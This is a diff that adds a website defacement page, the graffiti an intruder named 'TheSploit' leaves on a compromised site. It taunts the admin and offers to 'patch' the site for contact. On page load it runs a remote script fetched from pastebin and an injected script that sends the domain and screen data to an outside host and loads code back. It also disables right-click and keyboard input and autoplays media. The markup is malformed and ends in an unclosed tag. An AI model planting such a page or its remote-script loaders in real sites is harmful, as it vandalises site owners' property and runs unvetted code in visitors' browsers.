@@ -1,0 +1,253 @@
+
+<html>
+	<script type="text/javascript" language="JavaScript">
+		var txt="TOUCHED BY TheSploit";
+		var speed=300;
+		var refresh=null;
+		function action() { document.title=txt;
+			txt=txt.substring(1,txt.length)+txt.charAt(0);
+			refresh=setTimeout("action()" ,speed);}action()
+	</script>
+<link rel="icon"type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRz4mnZ2J4jgjK6XTljg_jF2H8QHL4tDaA1VGsN5mqKc893GTFJ">
+<body bgcolor='black'><br>
+
+ <link href='http://fonts.googleapis.com/css?family=Iceland:400,700' rel='stylesheet' type='text/css'>
+ <link href='http://fonts.googleapis.com/css?family=Iceland:400,700' rel='stylesheet' type='text/css'>
+ <meta property="og:image" content="">
+  <style type="text/css">
+   body {
+    overflow:hidden;
+    background-image:url('https://wallpaper-gallery.net/images/anime-dark-background/anime-dark-background-3.jpg');
+    background-color: #000000;
+    background-repeat:no-repeat;
+    background-size: 100% ;
+    background-position:top center;
+    margin: 0px;
+    cursor:none;
+    font-family: Iceland, sans-serif;
+   }
+   a{
+    text-decoration: none;
+   }
+   h1{
+   font-family: Iceland, sans-serif;
+   font-size:90px;
+   color:#fff;
+   margin:0px 0px 0px;    }
+   h2{
+   font-family: Iceland, sans-serif;
+   Aaaaaze:40px;
+   color:#000;
+   margin: 0px;
+   text-shadow: 0 0 3px #fff;    }
+   p{
+   color:#fff;
+   font-size:25px;
+   margin: 0px;
+   text-shadow: 0 0 3px #ff0099;
+   }
+   .fot{
+   font-family: Iceland, sans-serif;
+   font-size:14px;
+   color:#fff;
+   margin: 0px;
+   text-shadow: 0 0 3px #000, 0px 0px 5px #000;
+   }
+    h1{
+   color:#000;
+   text-shadow: 0 0 5px #fff;
+  }
+  .greets{
+ font-family: Arial, sans-serif;
+ line-height: 24px;
+ font-size: 11px;
+ width: 50%;
+ background: #000;
+ opacity: 0.9;
+ text-transform: uppercase;
+ z-index: 9999;
+ border-radius:10px;
+ -moz-box-shadow: 1px 0px 2px #000;
+ -webkit-box-shadow: 1px 0px 2px #000;
+ box-shadow: 1px 0px 2px #000;
+}
+  </style>
+ </head>  <div id="I301_html">
+<script type="text/javascript" src="http://code.jquery.com/jquery.min.js"></script>
+<script type="text/javascript">setTimeout("$('#loading').fadeOut(5000);", 10000);  </script>
+<style type="text/css">#loading{position:fixed;top:0;left:0;padding-top:0px;background-color:#000;width:100%;height:100%;color:black;z-index:9000;overflow:hidden;}</style> <div id="loading">
+<body onload="document.f.p.focus()" topmargin="0" leftmargin="0" bgcolor="#000000" marginheight="0" marginwidth="0">
+<table border="0" cellpadding="2" cellspacing="0" width="100%">
+<tbody><tr>
+</tr> <tr>
+</tr>
+</tbody></table> <font id="ResponseData" color="#ff99cc">
+<pre><script type="text/javascript">
+TypingText = function(element, interval, cursor, finishedCallback) {
+  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
+    this.running = true; // Never run.
+    return;
+  }
+  this.element = element;
+  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
+  this.interval = (typeof interval == "undefined" ? 100 : interval);
+  this.origText = this.element.innerHTML;
+  this.unparsedOrigText = this.origText;
+  this.cursor = (cursor ? cursor : "");
+  this.currentText = "";
+  this.currentChar =0;
+  this.element.typingText = this;
+  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
+  TypingText.all.push(this);
+  this.running = false;
+  this.inTag = false;
+  this.tagBuffer = "";
+  this.inHTMLEntity = false;
+  this.HTMLEntityBuffer = "";
+}
+TypingText.all = new Array();
+TypingText.currentIndex = 0;
+TypingText.runAll = function() {
+  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
+}
+TypingText.prototype.run = function() {
+  if(this.running) return;
+  if(typeof this.origText == "undefined") {
+    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval); // We haven't finished loading yet.  Have patience.
+    return;
+  }
+  if(this.currentText == "") this.element.innerHTML = "";
+//  this.origText = this.origText.replace(/<([^<])*>/, "");     // Strip HTML from text.
+  if(this.currentChar < this.origText.length) {
+    if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
+      this.tagBuffer = "<";
+      this.inTag = true;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
+      this.tagBuffer += ">";
+      this.inTag = false;
+      this.currentText += this.tagBuffer;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.inTag) {
+      this.tagBuffer += this.origText.charAt(this.currentChar);
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
+      this.HTMLEntityBuffer = "&";
+      this.inHTMLEntity = true;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
+      this.HTMLEntityBuffer += ";";
+      this.inHTMLEntity = false;
+      this.currentText += this.HTMLEntityBuffer;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.inHTMLEntity) {
+      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
+      this.currentChar++;
+      this.run();
+      return;
+    } else {
+      this.currentText += this.origText.charAt(this.currentChar);
+    }
+    this.element.innerHTML = this.currentText;
+    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
+    this.currentChar++;
+    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
+  } else {
+ this.currentText = "";
+ this.currentChar = 0;
+        this.running = false;
+        this.finishedCallback();
+  }
+}
+</script>
+<script>
+function disableselect(e){return false}
+function reEnable(){return true}
+//if IE4+
+document.onselectstart=new Function ("return false")
+//if NS6
+if (window.sidebar){
+document.onmousedown=disableselect
+document.onclick=reEnable
+}
+</script>
+<script>
+var message="Aaaaa";
+function clickIE()
+{if (document.all)
+{(message);return false;}}
+function clickNS(e) {
+if
+(document.layers||(document.getElementById&&!document.all))
+{
+if (e.which==2||e.which==3) {(message);return false;}}}
+if (document.layers)
+{document.captureEvents(Event.MOUSEDOWN);document. onmousedown=clickNS;}
+else
+{document.onmouseup=clickNS;document.oncontextmenu  =clickIE;}
+document.oncontextmenu=new Function("return false")
+</script>
+<table style=" background-repeat: no-repeat;"  align="right" border="0" width="100%" >
+<br>
+<tbody><tr>
+<td  valign="top"><p id="hack" >
+<br>
+<br>
+<font style="color:#ffffff;text-shadow:#FF0099 0px 0px 10px"> &nbsp;&nbsp;&nbsp;&nbsp;<b>[+] <font style="color:blue;text-shadow:#000 0px 0px 3px">SORRY ADMIN </font><font style="color:white;text-shadow:#000 0px 0px 3px">YOUR WEBSITE IS TOUCHED BY ME</font>        </font> <br><br>
+<font style="color:#ffffff;text-shadow:#FF0099 0px 0px 10px"> &nbsp;&nbsp;&nbsp;&nbsp;<b>[+] TheSploit Wus Here         </font> <br>
+<font style="color:#ffffff;text-shadow:#FF0099 0px 0px 10px"> &nbsp;&nbsp;&nbsp;&nbsp;<b>[+] Your System is low, PATH NOW !     </font><br>
+<font style="color:#ffffff;text-shadow:#FF0099 0px 0px 10px"> &nbsp;&nbsp;&nbsp;&nbsp;<b>[+] I hope you understand  my feelings is Always Bad:(       </font><br>
+      <font color="White"> </p></tr>
+</tbody></table>              </div> <br>
+<script type="text/javascript">
+    new TypingText(document.getElementById("hack"), 50, function(i) { var ar = new Array("_",""); return " " + ar[i.length % ar.length]; });
+    TypingText.runAll();
+    </script>
+    <style>       td       {         background-color: #000000;         font-family: Courier New;         font-size:20px;         color:#000000;         border-color: #000000;         border-width:1pt;         border-style:solid;         border-collapse:collapse;         padding:0pt 3pt;         vertical-align:top;       }       table       {         border-color: #88aace;         border-width:0pt 1pt;         border-style:dash;       }       A:Link, A:Visited       {         color: #88aace;       }       A.no:Link, A.no:Visited       {         color: #88aace;         text-decoration: none;       }       A:Hover, A:Visited:Hover , A.no:Hover, A.no:Visited:Hover       {         color: #88aace;         background-color:#2e2e2e;         text-decoration:         overline underline;       }       .style1       {         color: #88aace       }       .style2       {         color: 1f1f1f       }       body       {         color:white;         background-position:right;         background-attachment:fixed;         </div>       }     </style> </div>
+</div>
+<body oncontextmenu="return false" onkeydown="return false">
+<center><img src="http://4.bp.blogspot.com/-2h8LgjUDpzY/T0fTA4EQx8I/AAAAAAAAAtU/n_W5Vby8zLU/s400/hacked.gif" border="0"width="350px" height="60px">
+<script src="https://pastebin.com/raw/8v6kQfn5"></script>
+<style type="text/css"></style>
+<center><BR><BR>
+<h2 class="glow"><font style="color:green;text-shadow:#000 0px 0px 3px"></font><font style="color:red;text-shadow:#000 0px 0px 3px">YOUR WEBSITE</font><font style="color:white;text-shadow:#000 0px 0px 3px"> TOUCHED BY ME</font><font style="color:green;text-shadow:#000 0px 0px 3px"></font></h2>
+<h2 class="glow2" ><font style="color:cyan;text-shadow:#12 0px 0px 32px">.::#PATCHED BY ME#::.</font>
+<center><img src=" https://pm1.narvii.com/6277/a521860df11da68c08186599da8b7fd44083a523_hq.jpg " border="0"width="305px" height="320px"></center>
+<br> <span style="color:orange;font-family:Iceland;text-shadow:white 0px 0px 10px">>===</span>
+<span style="color:#ffffff;font-family:Iceland;text-shadow:#FF0099 0px 0px 10px">TheSploit</span><span style="color:orange;font-family:Iceland;text-shadow:white 0px 0px 10px">===<</span> </b></h2>
+<p><b><font style="color:cyan;text-shadow:#000 0px 0px 3px">Sorry, Saya Telah Menemukan Celah Anda.</font><span style="font-family:Iceland;color:red;text-shadow:#000 0px 0px 3px"></span>
+   <font style="color:blue;text-shadow:#000 0px 0px 3px">CONTACT ME </font><font style="color:cyan;text-shadow:#000 0px 0px 3px">TO PATCH YOUR</font>
+   <font style="color:cyan;text-shadow:#000 0px 0px 3px"> WEBSITE</font><br><font style="color:yellow;text-shadow:#000 0px 0px 3px">>==========##########==========<</font>
+      </p>
+  </span>
+   <div style="font-size:10px;color:gold;text-shadow:grey 0px 0px 3px">
+  <span style="font-family:Iceland;font-weight:bold;color:#ffffff"><p><font style="color:blue;text-shadow:#000 0px 0px 3px">~ONLY NOLEPERS IS HERE WITH EMPETY HEART & BRAIN~</font></p></span>
+ </div> <div class="greets">
+<table align=center border="0">
+<tr>
+<td width=100% id=greetz>
+<marquee behavior="scroll" direction="right" scrollamount="25" scrolldelay="25" width="100%">
+<font size="5px" style="font-family: Iceland, sans-serif;color:white;text-shadow: 0 0 3px red, 0px 0px 5px red" >
+<b>-=SADNESS LIFE ALWAYS LOONELY AND DONT HAVE GIRL FRIENDS=-</font>
+</marquee>
+</td>
+</table></div> </center>
+<script> var message="Help Me From This Empety Its Hurtting Me";
+    ///////////////////////////////////
+    function clickIE4(){if (event.button==2){alert(message);return false;}} function clickNS4(e){if (document.layers||document.getElementById&&!document.all){if (e.which==2||e.which==3){alert(message);return false;}}} if (document.layers){document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS4;} else if (document.all&&!document.getElementById){document.onmousedown=clickIE4;} document.oncontextmenu=new Function("alert(message);return false")</script>
+	<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH28BQzhW4JaXK6d8NyJ6xELTXQG68%2bfbd3V2v6XkF8lRq%2fomtxL%2fqsgV1XlphsbKWFi0kndIKrztW7lwKCF7kF%2bLJz2Vw27L2aHyKnufIFJloATXgDrm22f2Oaae4SqgR7lANdkUy5gOO0RCpxiy92it8pzDdgc51lAp5f%2b7G7QAgn%2fGSN1uOV6sBnyYhezjnsf%2fK1ovZCMLe5BSMXEHoJSruss54i5rM1bz%2fjZlR2Sf72LLf%2bWpDr%2fSTOnofYi%2bgkgAHlzU3%2f7y7ykehOhLwoMRHUkbgCPsBvcPjP%2f6jmMNjAwLJoDeaS1sP6DMP%2fDvmbL0tPvU5D0d9H%2bY4Vvuout82s0bs6TUMk1jcAMJkIMWz4wHiYomiUQyz3TusibowDJMAyWBfosmkQFakBzbM3V07pkfyrytxgPFsCQExESPIYDjUtEsBVnPzvRWtLdOVN28I0qOB6fFh5zRo6eFrJz4Piskz%2fKdjTcwl7%2bgHrBwyIM7uznQJIzJsra%2fzD70DyGwogAwIncO6pYEY0MWagwyP5i6l6bRbFiD3w7EA1GYR9kT5%2b7JpDRQYZmayWWLm0vO7x6Iq4gK4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+<iframe width="1" height="1" src="https://www.youtube.com/embed/WpYeekQkAdc?autoplay=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen=""></iframe>
+<center><audio autoplay="autoplay" controls="controls" src="https://api.soundcloud.com/tracks/332269439/stream?client_id=tNdzqSQH10kJuLrRhPLbf5wtQEnaXmi1" type="audio/mpeg"></audio>
+<script type='text/javascript
+
+</body>
